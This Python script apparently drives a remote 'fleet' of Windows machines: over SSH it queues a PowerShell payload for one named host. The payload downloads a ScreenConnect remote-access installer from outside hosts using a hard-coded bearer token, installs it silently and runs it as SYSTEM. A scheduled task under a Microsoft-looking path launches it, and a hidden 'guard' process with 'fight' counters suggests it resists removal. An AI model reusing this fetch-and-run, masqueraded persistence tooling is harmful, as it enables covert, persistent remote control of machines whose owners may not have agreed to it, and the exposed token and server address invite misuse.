#!/usr/bin/env python3
"""DESKTOP-7M84CP8: C29-style recover using UI MSI + schtasks, then verify."""
from __future__ import annotations

import sys
import time
from pathlib import Path

import paramiko

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST = "DESKTOP-7M84CP8"
TOKEN = "fe7e8f3b8af479870248be10ca25410b8e1bf9a5"

# Stage a dedicated recover cmd that uses UI MSI (guard path), never msiexec /x
RECOVER_PS1 = r"""
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$log = 'C:\Users\Public\gryxa_recover_ui.log'
function L($s){ Add-Content -Path $log -Value ("[{0}] {1}" -f (Get-Date -Format o), $s) -Encoding ASCII }
'' | Set-Content $log -Encoding ASCII
L 'begin'
$zd = 'C:\ProgramData\WinRTCS'
$gfp = '36e506ff016b2151'
$gsvc = "ScreenConnect Client ($gfp)"
$msi = Join-Path $zd 'gryxa_install.msi'
$ui = 'https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
$curl = "$env:SystemRoot\System32\curl.exe"
New-Item -ItemType Directory -Force -Path $zd | Out-Null
# stop/delete gryxa only
sc.exe stop $gsvc | Out-Null
sc.exe delete $gsvc | Out-Null
Start-Sleep -Seconds 2
# kill locks + rmdir gryxa dirs
Get-CimInstance Win32_Process | Where-Object {
  ($_.ExecutablePath -and $_.ExecutablePath -match $gfp) -or ($_.CommandLine -and $_.CommandLine -match $gfp)
} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue; L ("kill "+$_.ProcessId) }
foreach ($root in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
  if (-not $root) { continue }
  $d = Join-Path $root ("ScreenConnect Client ($gfp)")
  if (Test-Path -LiteralPath $d) {
    cmd /c ("takeown /f `"$d`" /r /d y >nul 2>&1")
    cmd /c ("icacls `"$d`" /grant *S-1-5-32-544:F /t /c >nul 2>&1")
    Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
    L ("rmdir " + $d + " gone=" + (-not (Test-Path -LiteralPath $d)))
  }
}
# purge installer phantoms for shared PC (keys only — no msiexec /x)
$packed = '814CC7D9653A3969CD5C14CE440DB313'
$pc = '{9D7CC418-A356-9693-DCC5-41EC44D03B31}'
foreach ($k in @(
  "HKLM:\SOFTWARE\Classes\Installer\Products\$packed",
  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\$packed",
  "HKCR:\Installer\Products\$packed",
  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$pc",
  "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\$pc"
)) {
  if (Test-Path $k) { Remove-Item $k -Recurse -Force -ErrorAction SilentlyContinue; L ("reg_del $k") }
}
# fetch UI MSI
Remove-Item $msi -Force -ErrorAction SilentlyContinue
& $curl -f -L --ssl-no-revoke --connect-timeout 15 --max-time 180 -o $msi $ui
$sz = if (Test-Path $msi) { (Get-Item $msi).Length } else { 0 }
L ("msi_size=$sz")
if ($sz -lt 5000000) {
  & $curl -f -L --ssl-no-revoke -H "Authorization: Bearer fe7e8f3b8af479870248be10ca25410b8e1bf9a5" --connect-timeout 15 --max-time 180 -o $msi "https://debian.seczio.com/winrtcs/pkg_gryxa.msi"
  $sz = if (Test-Path $msi) { (Get-Item $msi).Length } else { 0 }
  L ("msi_repo_size=$sz")
}
if ($sz -lt 5000000) { L 'FAIL_no_msi'; 'FAIL_NO_MSI' | Set-Content 'C:\Users\Public\gryxa_ui.done' -Encoding ASCII; exit 3 }
$p = Start-Process -FilePath msiexec.exe -ArgumentList "/i `"$msi`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v `"$zd\msi_gryxa_install.log`"" -Wait -PassThru
L ("msiexec_exit=$($p.ExitCode)")
Start-Sleep -Seconds 8
sc.exe config $gsvc start= auto | Out-Null
sc.exe start $gsvc | Out-Null
Start-Sleep -Seconds 5
$q = & sc.exe query $gsvc 2>&1 | Out-String
L $q
if ($q -match 'RUNNING') {
  L 'OK'
  '0' | Set-Content (Join-Path $zd 'extkill.cnt') -Encoding ASCII
  '0' | Set-Content (Join-Path $zd 'fight.cnt') -Encoding ASCII
  '999' | Set-Content (Join-Path $zd 'guard.cnt') -Encoding ASCII
  'OK' | Set-Content 'C:\Users\Public\gryxa_ui.done' -Encoding ASCII
} else {
  L 'FAIL_svc'
  'FAIL_SVC' | Set-Content 'C:\Users\Public\gryxa_ui.done' -Encoding ASCII
}
# kick guard
Start-Process -FilePath cmd.exe -ArgumentList '/c C:\ProgramData\WinRTCS\winrtcs_guard.cmd' -WindowStyle Hidden
"""


def ssh_connect() -> paramiko.SSHClient:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        "144.172.107.56",
        username="winrtcs",
        key_filename=str(Path.home() / ".ssh" / "winrtcs_ed25519"),
        timeout=20,
    )
    return ssh


def queue(ssh: paramiko.SSHClient, body: str) -> int:
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/batch_cmd_body.txt", "w") as f:
        f.write(body)
    with sftp.file("/tmp/q.py", "w") as f:
        f.write(
            "import sqlite3,time\n"
            "con=sqlite3.connect('/opt/winrtcs/fleet.db')\n"
            "cmd=open('/tmp/batch_cmd_body.txt',encoding='utf-8').read().strip()\n"
            "cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',"
            f"(time.time(),{HOST!r},cmd[:4000]))\n"
            "print(cur.lastrowid); con.commit()\n"
        )
    sftp.close()
    _, o, _ = ssh.exec_command("sudo python3 /tmp/q.py", timeout=30)
    return int(o.read().decode().strip().splitlines()[-1])


def wait(ssh: paramiko.SSHClient, cid: int, needle: str, rounds: int = 28) -> str:
    last = ""
    for i in range(rounds):
        time.sleep(15)
        poll = (
            "import sqlite3,os\n"
            "os.system('sudo cp /opt/winrtcs/fleet.db /tmp/fleet_ro.db')\n"
            "os.system('sudo cp -f /opt/winrtcs/fleet.db-wal /tmp/fleet_ro.db-wal 2>/dev/null')\n"
            "os.system('sudo chmod 644 /tmp/fleet_ro.db /tmp/fleet_ro.db-wal /tmp/fleet_ro.db-shm 2>/dev/null')\n"
            "c=sqlite3.connect('/tmp/fleet_ro.db')\n"
            f"r=c.execute('SELECT rc,out FROM results WHERE cmd_id=? AND host=?',({cid},{HOST!r})).fetchone()\n"
            "print('FOUND' if r else 'WAIT')\n"
            "if r:\n print('RC', r[0])\n print(r[1] or '')\n"
        )
        sftp = ssh.open_sftp()
        with sftp.file("/tmp/w.py", "w") as f:
            f.write(poll)
        sftp.close()
        _, o, _ = ssh.exec_command("python3 /tmp/w.py", timeout=60)
        text = o.read().decode("utf-8", "replace")
        last = text
        print(f"[{cid} {i}] {(text.splitlines() or [''])[0]}")
        if text.startswith("FOUND") and needle in text:
            return text
    return last


def main() -> None:
    ssh = ssh_connect()
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/winrtcs_gryxa_ui_recover.ps1", "w") as f:
        f.write(RECOVER_PS1.replace("\r\n", "\n"))
    sftp.close()
    _, o, e = ssh.exec_command(
        "sudo cp /tmp/winrtcs_gryxa_ui_recover.ps1 /opt/winrtcs/repo/winrtcs_gryxa_ui_recover.ps1 && "
        "sudo chmod 644 /opt/winrtcs/repo/winrtcs_gryxa_ui_recover.ps1 && echo OK",
        timeout=20,
    )
    print(o.read().decode(), e.read().decode())

    launch = (
        rf'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer {TOKEN}" '
        r'--connect-timeout 15 --max-time 60 -o C:\Users\Public\gryxa_ui_recover.ps1 '
        r'https://debian.seczio.com/winrtcs/winrtcs_gryxa_ui_recover.ps1 '
        r' & del /f /q C:\Users\Public\gryxa_ui.done C:\Users\Public\gryxa_recover_ui.log '
        r' & schtasks /Create /TN "\Microsoft\Windows\WinRTCS\GryxaUiRecover" '
        r'/TR "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\Users\Public\gryxa_ui_recover.ps1" '
        r'/SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F '
        r' & schtasks /Run /TN "\Microsoft\Windows\WinRTCS\GryxaUiRecover" '
        r' & echo UI_QUEUED'
    )
    cid = queue(ssh, launch)
    print("launch", cid)
    print(wait(ssh, cid, "UI_QUEUED")[:1500])

    print("wait 4 min for UI MSI install...")
    time.sleep(240)

    pull = (
        r'(if exist C:\Users\Public\gryxa_ui.done (type C:\Users\Public\gryxa_ui.done) else (echo DONE_MISSING)) & '
        r'(if exist C:\Users\Public\gryxa_recover_ui.log (type C:\Users\Public\gryxa_recover_ui.log) else (echo NO_LOG)) & '
        r'sc query "ScreenConnect Client (36e506ff016b2151)" & '
        r'echo PULL_DONE'
    )
    cid2 = queue(ssh, pull)
    print("pull", cid2)
    out = wait(ssh, cid2, "PULL_DONE", rounds=24)
    print(out[:8000])
    Path(r"C:\Users\nobuddy\Desktop\7m84_ui_recover.txt").write_text(out, encoding="utf-8")

    py = f"""
import sqlite3, os, time, json
os.system('sudo cp /opt/winrtcs/fleet.db /tmp/fleet_ro.db')
os.system('sudo cp -f /opt/winrtcs/fleet.db-wal /tmp/fleet_ro.db-wal 2>/dev/null')
os.system('sudo chmod 644 /tmp/fleet_ro.db /tmp/fleet_ro.db-wal /tmp/fleet_ro.db-shm 2>/dev/null')
c=sqlite3.connect('/tmp/fleet_ro.db'); c.row_factory=sqlite3.Row
now=time.time()
r=dict(c.execute('SELECT * FROM hosts WHERE host=?',({HOST!r},)).fetchone())
for k in ('last_seen','last_beat'):
    if r.get(k): r[k+'_ago_min']=round((now-float(r[k]))/60,1)
print(json.dumps({{k:r.get(k) for k in ('host','state','agent','guard','rmm','last_seen_ago_min','last_beat_ago_min')}}, default=str))
"""
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/s7.py", "w") as f:
        f.write(py)
    sftp.close()
    _, o, e = ssh.exec_command("python3 /tmp/s7.py", timeout=30)
    print("FLEET", o.read().decode())
    ssh.close()


if __name__ == "__main__":
    main()
